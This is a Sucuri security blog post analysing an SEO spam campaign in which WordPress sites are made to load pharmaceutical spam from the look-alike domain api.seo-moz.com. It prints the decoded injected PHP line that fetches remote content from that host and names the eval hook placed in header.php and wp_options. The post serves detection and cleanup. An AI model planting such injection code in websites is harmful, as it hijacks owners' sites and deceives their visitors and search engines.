@@ -1,0 +1,58 @@
+Seo-moz.com SEO Spam Campaign
+
+Here at Sucuri we handle countless cases of SEO spam. This malware involves a website being compromised in order to spread (mostly pharmaceutical) advertisements by linking visitors to unwanted websites and stuffing spam keywords into the site. These links and keywords help the spam websites to rank higher in search engines like Google, sending even more visitors to shady sites.
+As a team lead on the Security Remediation Team, we are always in touch with the latest and most advanced threats. SEO Spam techniques are constantly evolving, making them difficult to detect. They employ both new and old techniques that, even after years of dealing with them, still prove to be annoying. This post will demonstrate one such case I handled that was using an seo-moz.com SEO spam campaign.
+
+WordPress Sites Being Targeted
+Recently, we have been seeing a large number WordPress sites hacked and used as part of a Blackhat SEO SPAM campaign. This infection is different from other SEO spam infections we’re used to handling, because this time the malicious content is coming from an external source. We were able to track down the communication and find out the malicious content is coming from  “api.seo-moz.com”. For those in the SEO space, you’re undoubtedly familiar with the SEO company called MOZ (formerly SEOMoz); a SEO software company built to help you manage and improve your online SEO.
+If we look closely, we see that seo-moz.com is on CloudFlare:
+seo-moz.com has address 104.31.93.1
+
+NetRange: 104.16.0.0 - 104.31.255.255
+CIDR: 104.16.0.0/12
+NetName:CLOUDFLARENET
+
+The real seomoz.com is on Incapsula:
+seomoz.com has address 199.83.128.89
+
+NetRange: 199.83.128.0 - 199.83.135.255
+CIDR: 199.83.128.0/21
+NetName: INCAPSULA
+
+Let’s look closer at the process by which this SEO spam injection was uncovered and identified.
+SiteCheck
+For those unfamiliar, SiteCheck is our Free security scanner used by millions of websites a month. It provides a comprehensive scanning engine that allows a website owner to identify a wide range of potential security issues with their website, from malware to things like SEO spam. Learn more how SiteCheck works.
+Using SiteCheck, we were able to quickly see what was happening. This was the first evidence that something was wrong with the website. As you can see in the image below, it was displaying a (BlackHat) SEO spam warning on SiteCheck:
+SiteCheck Spam Results
+With this payload we are able to better understand what might be going on… more importantly however is why and how it’s happening.
+Checking the Page Source Code
+This is how the spam content looks on the live site when the malicious code is injected into the infected website. As a result, the first thing that will happen with this website is that it will be blacklisted by Google due the spam Pharma keywords.
+Spam code on the website
+Understanding the Infection
+Let’s check out this little piece of malicious code! We need to find where these spam keywords are coming from. Here is a snippet of the malware:
+Theme file code injection
+The  eval function was identified inside of the header.php file of the current WordPress theme. It’s calling the malicious content from “get_option” within the database. This code didn’t come with the original theme package – it was inserted by the hacker manually.
+It’s time to check database for clues. This is the first thing we did because it’s very common to see hundreds of these sorts of hidden links lodged within the database…. but it was all clean! There was no mention of the pharmaceutical words found in the page’s source code.
+Sleuthing For Spam
+What we do know is that the code is calling the function “get_option” and so we can start our research by looking for any “eval” string in the database. This is what we got:
+Eval malware in wp_options table
+The next step is for this eval string to be decoded, but first let’s talk about this database table. The wp_options table is unique among WordPress database tables in that it doesn’t share a relationship with any of the other tables. This is because it stores data about the site or network, rather than the content.
+To interact with the options table you can use the functions in the Options API or the Settings API. You can also make use of functions which add data network-wide in a Multisite installation. The options table stores a different kind of data from the other tables: instead of storing data about your site’s content, it stores data about the site itself.
+The Decode Process
+Actually, the steps which are necessary in order to decode this string are pretty simple. There are plenty of base64 decoders online, including our own free DDecode.  Here is what we got after the decode process:
+<?php echo @file_get_contents(“http://api.seo-moz.com/link?d=&#8221; . $_SERVER[“SERVER_NAME”] . “&u=” . $_SERVER[“REQUEST_URI”]);
+First we see the contents of a URL being pulled in. If you are not familiar with Moz (formerly SEOMoz), they are a respected SEO company. This is not their URL, however, it is clear that attackers are using their name in order to fool people into thinking this is part of their API.
+Server Variables
+The rest of this PHP code is breaking down the URL into components. Here is some information regarding the variables:
+
+$_SERVER[‘REQUEST_URI’] – This returns the part of the URL needed to access the page which is executing the script. For example, if you need to type http://www.website.com/products.php?id=10 to access the page then the $_SERVER[‘REQUEST_URI’] returns “/products.php?id=10”. In the case of the code above for “api.seo-moz.com” this would be /link?d=&#8221
+$_SERVER[“SERVER_NAME”] – The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host.
+
+The Proof of Concept
+Let’s create a script called seo.php to prove how the injection works on any site. This PHP code will simulate a connection to the api.seo-moz.com and strip the Request URI so it can be added to the referring site.
+
+Now, it’s time to test our code and see the how the malicious content is added by using Sucuri.net as the referrer and a standard user-agent.
+
+As we can see, we got the same content of the infected website even when the referring URL is set to http://sucuri.net. This way we can prove that the infection is really coming from “api.seo-moz.com”.
+Conclusion
+This is an extreme example of how spam content can be hidden on another site and loaded into the infected website. The visitor would never know that the content was not from the infected website to begin with, and neither would Google. This leads to blacklisting for spam and can really hurt your visitors. If you’re in need of a solution to protect and clean your site, don’t hesitate to inquire about our Website AntiVirus.
